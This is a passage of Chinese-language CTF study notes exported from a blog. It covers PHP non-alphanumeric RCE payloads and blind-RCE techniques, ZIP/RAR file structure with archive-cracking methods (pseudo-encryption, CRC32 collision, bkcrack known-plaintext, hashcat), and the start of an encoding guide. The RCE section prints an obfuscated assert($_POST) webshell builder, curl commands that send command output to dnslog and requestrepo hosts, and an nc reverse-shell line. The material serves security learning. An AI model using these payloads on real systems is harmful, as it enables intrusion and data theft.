class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br>固定格式 构造出来的 <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>然后post传入   _=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>

<p>CTFSHOW无字符RCE挑战中有更深入的利用方法</p>
<h1 id="无回显情况的几种利用方式"><a href="#无回显情况的几种利用方式" class="headerlink" title="无回显情况的几种利用方式"></a>无回显情况的几种利用方式</h1><p>题目中较常见的是<code>shell_exec</code>函数，与<code>system</code>函数相比，前者没有回显结果</p>
<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>当有写入的权限时，可以考虑将结果写到文件中</p>
<p>例如：<code>ls&gt;1.txt;</code></p>
<h2 id="dns外带信息"><a href="#dns外带信息" class="headerlink" title="dns外带信息"></a>dns外带信息</h2><p>假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有<code>http://dnslog.cn/</code></p>
<p>例如我们生成一个域名<code>c9n9j5.dnslog.cn</code>，然后在靶机上执行<code>curl `whoami`.c9n9j5.dnslog.cn</code></p>
<p>刷新后就会在平台上返回结果</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/dnslog.png"></p>
<h2 id="http外带信息"><a href="#http外带信息" class="headerlink" title="http外带信息"></a>http外带信息</h2><p>实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等</p>
<p>所以可以用http的方式，推荐一个平台<code>https://requestrepo.com/#/</code>，用来接收get，post请求等</p>
<p>在靶机上执行<code>curl http://mt2dyif2.requestrepo.com/?1=`whoami` </code>，过一会在平台上就会有请求返回(子域名是随机生成的)</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/http.png"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>不回显的利用方式肯定少不了最经典的反弹shell</p>
<p>常规反弹语句：<code>nc ip port -e /bin/sh</code>，监听：<code>nc -lvnp port</code></p>
<p>反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式<code>https://your-shell.com/</code></p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法</p>
<p>原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(压缩文件篇)</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E7%AF%87).html</url>
    <content><![CDATA[<h1 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h1><p><code>ZIP</code>通常使用后缀名<code>.zip</code>，它的<code>MIME</code>格式为<code>application/zip</code></p>
<h2 id="文件结构分析"><a href="#文件结构分析" class="headerlink" title="文件结构分析"></a>文件结构分析</h2><p>引用<a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">官方文档</a>中对于一个标准zip文件组成部分的描述：</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">[local file header <span class="hljs-number">1</span>]<br>[file data <span class="hljs-number">1</span>]<br>[data descriptor <span class="hljs-number">1</span>]<br>.<br>.<br>.<br>[local file header n]<br>[file data n]<br>[data descriptor n]<br>[archive decryption header] (<span class="hljs-symbol">EFS</span>)<br>[archive extra data record] (<span class="hljs-symbol">EFS</span>)<br>[central directory]<br>[zip64 end of central directory record]<br>[zip64 end of central directory locator]<br>[end of central directory record]<br></code></pre></td></tr></table></figure>

<p>为了演示结构，首先创建一个<code>flag.txt</code>，分别压缩成<code>flag1.zip(无密码)</code>和<code>flag2.zip(有密码)</code>（使用的是winrar默认参数压缩）</p>
<p>推荐使用<code>010 editor</code>分析</p>
<p>先看<code>flag1.zip</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-1.png"></p>
<p>大致可以分为三个部分：<code>local file header + file data + data descriptor</code>和<code>central directory</code>以及一个<code>end of central directory record</code>组成（对应图中的三种颜色）</p>
<h3 id="文件头-Local-file-header"><a href="#文件头-Local-file-header" class="headerlink" title="文件头(Local file header)"></a>文件头(Local file header)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Local file header signature</td>
<td>4</td>
<td>文件头标识，固定值(50 4B 03 04)</td>
</tr>
<tr>
<td>Version needed to extract</td>
<td>2</td>
<td>解压文件所需的ZIP最低版本</td>
</tr>
<tr>
<td>General purpose bit flag</td>
<td>2</td>
<td>通用位标志，通常只需要考虑当bit 0为1时表示文件被加密</td>
</tr>
<tr>
<td>Compression method</td>
<td>2</td>
<td>压缩方式，当值为：0x0000时表示无压缩</td>
</tr>
<tr>
<td>Last mod file time</td>
<td>2</td>
<td>文件最后修改时间，以standard MS-DOS格式编码</td>
</tr>
<tr>
<td>Last mod file date</td>
<td>2</td>
<td>文件最后修改日期</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>未压缩数据的CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>压缩后的大小，单位为byte</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>未压缩的大小</td>
</tr>
<tr>
<td>File name length</td>
<td>2</td>
<td>文件名长度</td>
</tr>
<tr>
<td>Extra field length</td>
<td>2</td>
<td>扩展区域长度</td>
</tr>
<tr>
<td>File name</td>
<td>N</td>
<td>文件名</td>
</tr>
<tr>
<td>Extra field</td>
<td>N</td>
<td>扩展区域</td>
</tr>
</tbody></table>
<h3 id="文件数据-File-data"><a href="#文件数据-File-data" class="headerlink" title="文件数据(File data)"></a>文件数据(File data)</h3><p>应将文件的压缩或存储数据紧随在文件头(Local File Header)后。如果文件已加密，则文件的加密头(encryption header)应放置在本地文件头(Local File Header)之后和文件数据之前。</p>
<p>对于<code>.ZIP</code>压缩文档中的每个文件，重复执行一系列的<code>[文件头][加密头][文件数据][数据描述符]</code>结构。</p>
<h3 id="数据描述符-Data-descriptor"><a href="#数据描述符-Data-descriptor" class="headerlink" title="数据描述符(Data descriptor)"></a>数据描述符(Data descriptor)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Optional data descriptor signature</td>
<td>4</td>
<td>(可选的)数据描述符标识，固定值(50 4B 07 08)</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>未压缩数据的CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>压缩后的大小</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>未压缩的大小</td>
</tr>
</tbody></table>
<p>如果设置了通用位标志的位3，则该描述符必须存在，它按字节对齐，紧随压缩数据的最后一个字节，仅在无法在输出的.ZIP文件中查找时(例如，当输出.ZIP文件是标准输出或不可搜索的设备时)，才应使用此描述符</p>
<p>例如<code>flag2.zip</code>中的绿色部分</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-2.png"></p>
<h3 id="核心目录-Central-directory"><a href="#核心目录-Central-directory" class="headerlink" title="核心目录(Central directory)"></a>核心目录(Central directory)</h3><p><code>Central directory</code>包括<code>File header</code>和<code>Digital signature</code></p>
<p>文件头：</p>
<table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Central directory file header signature</td>
<td>4</td>
<td>中心目录文件头标识，固定值(50 4B 01 02)</td>
</tr>
<tr>
<td>Version made by</td>
<td>2</td>
<td>压缩所用的ZIP版本</td>
</tr>
<tr>
<td>Version needed to extract</td>
<td>2</td>
<td>解压文件所需的ZIP最低版本</td>
</tr>
<tr>
<td>General purpose bit flag</td>
<td>2</td>
<td>通用位标记</td>
</tr>
<tr>
<td>Compression method</td>
<td>2</td>
<td>压缩方法</td>
</tr>
<tr>
<td>Last mod file time</td>
<td>2</td>
<td>文件最后修改时间</td>
</tr>
<tr>
<td>Last mod file date</td>
<td>2</td>
<td>文件最后修改日期</td>
</tr>
<tr>
<td>CRC-32</td>
<td>4</td>
<td>未压缩数据的CRC32</td>
</tr>
<tr>
<td>Compressed size</td>
<td>4</td>
<td>压缩后的大小</td>
</tr>
<tr>
<td>Uncompressed size</td>
<td>4</td>
<td>未压缩的大小</td>
</tr>
<tr>
<td>File name length</td>
<td>2</td>
<td>文件名长度</td>
</tr>
<tr>
<td>Extra field length</td>
<td>2</td>
<td>扩展区域长度</td>
</tr>
<tr>
<td>File comment length</td>
<td>2</td>
<td>文件注释长度</td>
</tr>
<tr>
<td>Disk number start</td>
<td>2</td>
<td>文件开始位置所在的磁盘编号</td>
</tr>
<tr>
<td>Internal file attributes</td>
<td>2</td>
<td>内部文件属性</td>
</tr>
<tr>
<td>External file attributes</td>
<td>4</td>
<td>外部文件属性</td>
</tr>
<tr>
<td>Relative offset of local header</td>
<td>4</td>
<td>本地文件头的相对偏移</td>
</tr>
<tr>
<td>File name</td>
<td>N</td>
<td>文件名</td>
</tr>
<tr>
<td>Extra field</td>
<td>N</td>
<td>扩展区域</td>
</tr>
<tr>
<td>File comment</td>
<td>N</td>
<td>文件注释</td>
</tr>
</tbody></table>
<p>数字签名：<br>此区域不是必须的</p>
<table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Header signature</td>
<td>4</td>
<td>头标识，固定值(50 4B 05 05)</td>
</tr>
<tr>
<td>Size of data</td>
<td>2</td>
<td>数据的大小</td>
</tr>
<tr>
<td>Signature data</td>
<td>N</td>
<td>签名数据</td>
</tr>
</tbody></table>
<h3 id="目录结束标识-End-of-central-directory-record"><a href="#目录结束标识-End-of-central-directory-record" class="headerlink" title="目录结束标识(End of central directory record)"></a>目录结束标识(End of central directory record)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>End of central directory signature</td>
<td>4</td>
<td>中心目录结束标识，固定值(50 4B 05 06)</td>
</tr>
<tr>
<td>Number of this disk</td>
<td>2</td>
<td>当前磁盘编号</td>
</tr>
<tr>
<td>Number of the disk with the start of the central directory</td>
<td>2</td>
<td>中心目录开头所在的磁盘号</td>
</tr>
<tr>
<td>Total number of entries in the central directory on this disk</td>
<td>2</td>
<td>该磁盘上中心目录的条目总数</td>
</tr>
<tr>
<td>Total number of entries in the central directory</td>
<td>2</td>
<td>中心目录的条目总数</td>
</tr>
<tr>
<td>Size of the central directory</td>
<td>4</td>
<td>中心目录的大小</td>
</tr>
<tr>
<td>Offset of start of central directory with respect to the starting disk number</td>
<td>4</td>
<td>中心目录开始位置相对于压缩文档开始位置的偏移</td>
</tr>
<tr>
<td>.ZIP file comment length</td>
<td>2</td>
<td>.ZIP文件注释长度</td>
</tr>
<tr>
<td>.ZIP file comment</td>
<td>N</td>
<td>.ZIP文件注释</td>
</tr>
</tbody></table>
<h2 id="常见考点"><a href="#常见考点" class="headerlink" title="常见考点"></a>常见考点</h2><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>伪加密可以说是非常常见，基础的考点了，正如名字中的<code>伪</code>，它本身并没有加密，但是通过修改<code>通用位标记</code>，可以使得解压软件认为这个文件存在加密</p>
<p>例题：<a href="https://buuoj.cn/challenges#zip%E4%BC%AA%E5%8A%A0%E5%AF%86">BUU-zip伪加密</a></p>
<p>可以看到是需要密码的</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-3.png"></p>
<p><code>010 editor</code>查看，修改<code>通用位标记</code>为<code>0x0000</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-4.png"></p>
<p>修改后可以直接解压了</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>使用工具(archpr)或者脚本(python)对压缩包进行暴力破解密码</p>
<p>基本可以分为<code>纯暴力</code>，<code>掩码</code>，<code>字典</code></p>
<p>纯暴力：一般是弱口令或者纯数字</p>
<p>掩码：知道了密码的一部分，用掩码进行爆破。例如<code>??ert??</code>可以去匹配中间为<code>ert</code>的密码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-5.png"></p>
<p>字典：用题目中给出的或自己的弱口令字典去跑</p>
<h3 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h3><p>每个文件都有唯一的<code>CRC32</code>值，即使文件中有个一个<code>bit</code>发生了变化，<code>CRC32</code>值也会不同</p>
<p><code>CRC32</code>爆破就是知道文件中一段数据的长度和文件的<code>CRC32</code>值，通过脚本程序，利用穷举法，与其<code>CRC32</code>对照，从而达到猜解数据的目的（通常只适用于较小的文本文件，文件太大穷举难度太大）</p>
<p>例题：<a href="https://buuoj.cn/challenges#zip">BUU-zip</a></p>
<p><a href="https://github.com/kmyk/zip-crc-cracker">github脚本1</a><br><a href="https://github.com/theonlypwner/crc32">github脚本2</a></p>
<p>下载附件，解压得到<code>68</code>个压缩包，并且每个压缩文件里都有一个<code>4</code>个字节大小的名为<code>data.txt</code>的<code>txt</code>文件，于是尝试用<code>crc32</code>碰撞还原出所有压缩包中的文件内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-6.png"></p>
<p>得到一串base64编码后的字符串，解压后修复压缩包得到flag</p>
<h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。</p>
<p>注意：明文对应文件的加密算法需要是<code>ZipCrypto Store</code>(linux下可以用unzip -v等命令查看)</p>
<p><a href="https://flandre-scarlet.moe/blog/1685/">ZIP 明文攻击原理</a></p>
<p>例题：<a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB">BUU-[ACTF新生赛2020]明文攻击</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-7.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-8.png"></p>
<h3 id="深入明文攻击-bkcrack"><a href="#深入明文攻击-bkcrack" class="headerlink" title="深入明文攻击-bkcrack"></a>深入明文攻击-bkcrack</h3><p>上个例子的明文攻击使用的是完整的文件，但是有时候没有文件，只知道加密文件的一部分字节数据(至少12个字节及偏移)，这时候如果满足加密算法(ZipCrypto Store)条件，就可以使用深入明文攻击</p>
<p>例题：2022西湖论剑-take_the_zip_easy</p>
<p>已知算法为<code>ZipCrypto Store</code>，且有一个zip文件，就可以得知文件头为<code>504B030414000000</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-9.png"></p>
<p><code>echo -n &quot;dasflow.pcapng&quot; &gt; plain.out</code><br><code>./bkcrack -C zipeasy.zip -c dasflow.zip -p plain.out -o 30 -x 0 504B030414000000</code></p>
<p>参数解释：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">-C 加密压缩包<br>-c 提取的密文部分<br>-p 提取的明文部分<br>-o offset  -p参数指定的明文在压缩包内目标文件的偏移量<br>-x 压缩包内目标文件的偏移地址  部分已知明文值<br></code></pre></td></tr></table></figure>

<p><code>-o</code>为<code>30</code>是因为在zip格式中第三十位固定为压缩文件的名字</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-10.png"></p>
<p>拿到key：<code>2b7d78f3 0ebcabad a069728c</code>，这个还不是真正的密码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-11.png"></p>
<p>通过<code>key</code>修改密码为<code>easy</code>，保存到<code>easy.zip</code><br><code>./bkcrack -C zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -U easy.zip easy</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-12.png"></p>
<h1 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h1><h2 id="文件结构分析-1"><a href="#文件结构分析-1" class="headerlink" title="文件结构分析"></a>文件结构分析</h2><p>RAR不同于ZIP，RAR是一种专利文件格式<br>2.0 版本前加密算法未公开，2.0 版本后使用AES算法加密</p>
<p>RAR 5.0签名和RAR4.x的签名不一样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs test">RAR 5.0 签名由8个字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br><br>RAR 4.x 签名由7字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00<br></code></pre></td></tr></table></figure>

<p><strong>因为rar是商业格式，所以不同软件不同版本所压缩出来的可能会有细微差别，可以参考010中的rar模板</strong></p>
<p>本文以RAR4.x为例子，可以大致分为四部分</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-13.png"></p>
<h3 id="标记块-MARK-HEAD"><a href="#标记块-MARK-HEAD" class="headerlink" title="标记块(MARK_HEAD)"></a>标记块(MARK_HEAD)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>总是0x6152</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x72</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>总是0x1A21</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>块大小 &#x3D; 0x0007，即7个字节</td>
</tr>
</tbody></table>
<p>所以这里标记块的大小固定是<code>7</code>个字节，且是一个固定的字节序列。标记块也称为Magic number。</p>
<h3 id="压缩文件头-MAIN-HEAD"><a href="#压缩文件头-MAIN-HEAD" class="headerlink" title="压缩文件头(MAIN_HEAD)"></a>压缩文件头(MAIN_HEAD)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>HEAD_TYPE到RESERVED2的CRC</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x73</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>位标记</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>压缩文件头总大小（包括压缩文件注释）</td>
</tr>
<tr>
<td>RESERVED1</td>
<td>2</td>
<td>保留</td>
</tr>
<tr>
<td>RESERVED2</td>
<td>4</td>
<td>保留</td>
</tr>
</tbody></table>
<p>对于压缩文件头里的位标记，如果它的第9位(从左到右)被置1(则位标记应为0x0080)，块头被加密，也就是通常所说的加密文件名，打开这样加密的RAR文件时，需要先输入密码才能看到压缩包内的文件列表</p>
<h3 id="文件头-FILE-HEAD"><a href="#文件头-FILE-HEAD" class="headerlink" title="文件头(FILE_HEAD)"></a>文件头(FILE_HEAD)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>从HEAD_TYPE到FILE_NAME的CRC</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x74</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>位标记</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>文件头的全部大小(包含文件名和注释)</td>
</tr>
<tr>
<td>PACK_SIZE</td>
<td>4</td>
<td>已压缩文件大小</td>
</tr>
<tr>
<td>UNP_SIZE</td>
<td>4</td>
<td>未压缩文件大小</td>
</tr>
<tr>
<td>HOST_OS</td>
<td>1</td>
<td>保存压缩文件使用的操作系统</td>
</tr>
<tr>
<td>FILE_CRC</td>
<td>4</td>
<td>文件CRC</td>
</tr>
<tr>
<td>FTIME</td>
<td>4</td>
<td>MS DOS标准格式的日期和时间</td>
</tr>
<tr>
<td>UNP_VER</td>
<td>1</td>
<td>解压文件所需要最低RAR版本，版本编码方法：10 * 主版本 + 副版本。</td>
</tr>
<tr>
<td>METHOD</td>
<td>1</td>
<td>压缩方式</td>
</tr>
<tr>
<td>NAME_SIZE</td>
<td>2</td>
<td>文件名大小</td>
</tr>
<tr>
<td>ATTR</td>
<td>4</td>
<td>文件属性</td>
</tr>
<tr>
<td>HIGH_PACK_SIZE</td>
<td>4</td>
<td>可选值，已压缩文件大小64位值的高4字节。只HEAD_FLAGS中的0x100位被设置才存在。</td>
</tr>
<tr>
<td>HIGH_UNP_SIZE</td>
<td>4</td>
<td>可选值，未压缩文件大小64位值的高4字节。只有HEAD_FLAGS中的0x100位被设置才存在。</td>
</tr>
<tr>
<td>FILE_NAME</td>
<td>NAME_SIZE</td>
<td>文件名 - NAME_SIZE字节大小字符串</td>
</tr>
<tr>
<td>SALT</td>
<td>8</td>
<td>可选值，如果(HEAD_FLAGS &amp; 0x400)!&#x3D; 0，则存在</td>
</tr>
<tr>
<td>EXT_TIME</td>
<td>可变大小</td>
<td>可选值，扩展时间区域，如果(HEAD_FLAGS &amp; 0x1000)!&#x3D; 0，则存在</td>
</tr>
</tbody></table>
<p>在这个块中，存在两个CRC值，一个是文件头块中从块类型到文件名的校验，后一个则是压缩包中所含文件的CRC校验，解压时，会计算解压后生成文件的CRC值，如果等于这里的CRC，则解压完成，如果不同，则报错中断。</p>
<h3 id="结尾块-ENDARC-HEAD"><a href="#结尾块-ENDARC-HEAD" class="headerlink" title="结尾块(ENDARC_HEAD)"></a>结尾块(ENDARC_HEAD)</h3><table>
<thead>
<tr>
<th>字段名称</th>
<th>长度(byte)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>HEAD_CRC</td>
<td>2</td>
<td>从HEAD_TYPE 到HEAD_SIZE 的CRC校验值</td>
</tr>
<tr>
<td>HEAD_TYPE</td>
<td>1</td>
<td>0x7B</td>
</tr>
<tr>
<td>HEAD_FLAGS</td>
<td>2</td>
<td>位标记</td>
</tr>
<tr>
<td>HEAD_SIZE</td>
<td>2</td>
<td>结尾块大小</td>
</tr>
</tbody></table>
<p>与标记块类似的是，结尾块也是一个固定字节串的块，依次是<code>C4 3D 7B 00 40 07 00</code></p>
<h2 id="常见考点-1"><a href="#常见考点-1" class="headerlink" title="常见考点"></a>常见考点</h2><h3 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>比如：</p>
<p>rar2john先提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p>
<p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p>
<h3 id="伪加密-1"><a href="#伪加密-1" class="headerlink" title="伪加密"></a>伪加密</h3><p>rar在伪加密状态下会显示压缩包已损坏或压缩格式未知，所以很容易判断rar是否是伪加密</p>
<p>修改<code>FILE_HEAD</code>中的<code>HEAD_FLAGS</code>即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-15.png"></p>
<p>例题：<a href="https://buuoj.cn/match/matches/2/challenges#%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86">BUU-[VNCTF 2021]冰冰好像藏着秘密</a></p>
<p>一打开就是一堆报错</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/misc-zip-14.png"></p>
<p>修改第24字节为<code>80</code>即可正常打开</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="Zipbomb"><a href="#Zipbomb" class="headerlink" title="Zipbomb"></a>Zipbomb</h2><p>压缩包炸弹，利用压缩算法的特性，做到仅仅几kb和仅mb的压缩包文件，解压出来GB，甚至PB级的数据</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os.path<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> re<br><br>dir_path=<span class="hljs-string">&#x27;C:\\Users\\19307\\Desktop\\11aa\\a&#x27;</span><br>files= os.listdir(dir_path)<br>newfiles = files[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(newfiles)<br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> newfiles:<br>    position = dir_path+<span class="hljs-string">&#x27;\\&#x27;</span>+ file<br>    <span class="hljs-built_in">print</span> (position)<br>    z = zipfile.ZipFile(position, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> z.namelist():<br>        <span class="hljs-built_in">bytes</span> = z.read(filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Zmxh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(filename)<br></code></pre></td></tr></table></figure>

<p>例题：<a href="https://buuoj.cn/match/matches/36/challenges#ZipBomb">BUU-DASCTF Sept X ZipBomb</a></p>
<p>参考<br><a href="https://sp4n9x.github.io/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIP文件格式分析</a><br><a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.6.TXT">ZIP官方文档 - APPNOTE-6.3.6.TXT</a><br><a href="https://sp4n9x.github.io/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">RAR文件格式分析</a><br><a href="https://en.wikipedia.org/wiki/RAR_(file_format)">RAR-wiki</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>misc</tag>
        <tag>隐写</tag>
        <tag>压缩文件</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(编码篇)</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E7%BC%96%E7%A0%81%E7%AF%87).html</url>
    <content><![CDATA[<p>编码&amp;密码篇</p>
<blockquote>
<p>推荐<a href="https://www.dcode.fr/">https://www.dcode.fr/</a>和CyberChef</p>
</blockquote>
<h1 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h1><h2 id="1-1-ASCII编码"><a href="#1-1-ASCII编码" class="headerlink" title="1.1. ASCII编码"></a>1.1. ASCII编码</h2><p>ASCII码大致可以分作三部分组成。</p>
<p>第一部分是：ASCII非打印控制字符。ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。</p>
<p>第二部分是：ASCII打印字符。数字 32–126 分配给了能在键盘上找到的字符，数字127代表 DELETE 命令。</p>
<p>第三部分是：扩展ASCII打印字符。扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。</p>
